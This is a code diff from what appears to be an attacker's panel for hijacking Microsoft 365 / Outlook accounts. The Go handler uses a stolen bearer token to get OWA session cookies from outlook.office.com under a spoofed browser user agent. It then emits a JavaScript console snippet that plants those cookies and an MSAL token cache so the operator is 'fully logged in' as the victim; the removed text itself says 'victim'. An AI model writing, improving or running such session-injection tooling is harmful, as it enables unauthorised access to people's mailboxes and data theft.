@@ -1182,11 +1182,59 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	// Also add the MSAL account-keys index that some MSAL versions require
 	entries["msal.account.keys"] = []string{accountKey}
 
-	// Build JS snippet — writes to BOTH localStorage and sessionStorage
-	// because OWA's MSAL cacheLocation may be either
+	// ── Server-side OWA warm-up: hit outlook.office.com with bearer so
+	// Microsoft sets its session cookies in our jar; we pass those to the
+	// inject snippet so the admin's browser is fully authenticated without
+	// needing the broken proxy (no cross-origin, no MetaMask SES, no crypto).
+	type cookieKV struct {
+		Name  string `json:"n"`
+		Value string `json:"v"`
+		Path  string `json:"p"`
+	}
+	var owaCookieKVs []cookieKV
+	{
+		owaJar, _ := cookiejar.New(nil)
+		owaWarmClient := &http.Client{
+			Jar:     owaJar,
+			Timeout: 15 * time.Second,
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				if len(via) > 15 {
+					return http.ErrUseLastResponse
+				}
+				req.Header.Set("Authorization", "Bearer "+owaAT)
+				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+				return nil
+			},
+		}
+		// Hit /owa/ first (sets canary + client-id cookies), then /mail/
+		for _, warmPath := range []string{"https://outlook.office.com/owa/", "https://outlook.office.com/mail/"} {
+			wReq, _ := http.NewRequest("GET", warmPath, nil)
+			wReq.Header.Set("Authorization", "Bearer "+owaAT)
+			wReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+			wReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+			owaWarmClient.Do(wReq) //nolint
+		}
+		owaURL, _ := url.Parse("https://outlook.office.com")
+		for _, c := range owaJar.Cookies(owaURL) {
+			owaCookieKVs = append(owaCookieKVs, cookieKV{Name: c.Name, Value: c.Value, Path: "/"})
+		}
+	}
+	owaCookiesJSON, _ := json.Marshal(owaCookieKVs)
+
+	// Build JS snippet:
+	//   1. Set OWA session cookies (obtained server-side via bearer warm-up)
+	//   2. Write MSAL v2 cache to localStorage + sessionStorage
+	//   3. Reload → fully logged in
 	var js strings.Builder
-	js.WriteString("(function(){\n  var d=")
 	entriesJSON, _ := json.Marshal(entries)
+	js.WriteString("(function(){\n")
+	js.WriteString("  /* 1. OWA session cookies */\n")
+	js.WriteString("  var ck=")
+	js.Write(owaCookiesJSON)
+	js.WriteString(";\n")
+	js.WriteString("  ck.forEach(function(c){try{document.cookie=c.n+'='+c.v+'; path='+c.p+'; secure';}catch(e){}});\n")
+	js.WriteString("  /* 2. MSAL v2 token cache */\n")
+	js.WriteString("  var d=")
 	js.WriteString(string(entriesJSON))
 	js.WriteString(";\n")
 	js.WriteString(`  Object.keys(d).forEach(function(k){
@@ -1194,7 +1242,7 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
     try{localStorage.setItem(k,v);}catch(e){}
     try{sessionStorage.setItem(k,v);}catch(e){}
   });
-  console.log('%c✓ Session injected — reloading','color:#0a0;font-size:14px;font-weight:bold');
+  console.log('%c✓ OWA session injected — reloading','color:#0a0;font-size:14px;font-weight:bold');
   setTimeout(function(){location.reload();},400);
 })();`)
 
@@ -1227,25 +1275,25 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 </style></head><body>
 <a class="back" href="/dc/use/%s">&larr; Dashboard</a>
 <h1>Inject Browser Session</h1>
-<p class="sub">Log into victim's Outlook from your browser — no password needed</p>
+<p class="sub">Full OWA access as <strong style="color:#fff">%s</strong> — cookies + tokens in one paste</p>
 <div class="card">
 <h2>Steps</h2>
 <ol class="steps">
-<li>Click <strong>Open OWA</strong> below — opens outlook.office.com in a new tab (not logged in yet)</li>
-<li>In that tab press <strong>F12</strong> → <strong>Console</strong> tab</li>
-<li>Click <strong>Copy Snippet</strong>, paste in the console and press <strong>Enter</strong></li>
-<li>Page reloads → you are logged in as <strong>%s</strong></li>
+<li>Click <strong>Copy &amp; Open OWA</strong> — copies the script and opens outlook.office.com in a new tab</li>
+<li>In that new tab press <strong>F12</strong> → <strong>Console</strong> tab</li>
+<li>Paste (<strong>Ctrl+V</strong>) and press <strong>Enter</strong></li>
+<li>Page reloads → you are fully logged in as <strong>%s</strong></li>
 </ol>
 </div>
 <div class="card">
-<h2>Console Snippet</h2>
+<h2>Injection Script <span style="font-size:10px;color:#444;font-weight:normal;text-transform:none;letter-spacing:0">(OWA session cookies + MSAL token cache)</span></h2>
 <textarea class="code" id="ta" readonly>%s</textarea>
 <div class="row">
-<button class="btn" id="cpbtn" onclick="doCopy()">Copy Snippet</button>
-<a class="btn b2" href="https://outlook.office.com/mail/" target="_blank" onclick="doCopy()">Copy &amp; Open OWA</a>
+<a class="btn" href="https://outlook.office.com/mail/" target="_blank" onclick="doCopy()">Copy &amp; Open OWA</a>
+<button class="btn b2" id="cpbtn" onclick="doCopy()">Copy Only</button>
 <span class="ok" id="ok">Copied!</span>
 </div>
-<p class="note">If copy fails: click inside the text box, press Ctrl+A then Ctrl+C</p>
+<p class="note">If copy fails: click inside the text box, press Ctrl+A then Ctrl+C, then paste in the OWA console</p>
 </div>
 <div class="card" style="font-size:12px;color:#555;line-height:1.9">
   <div>Target: <span style="color:#888">%s</span></div>
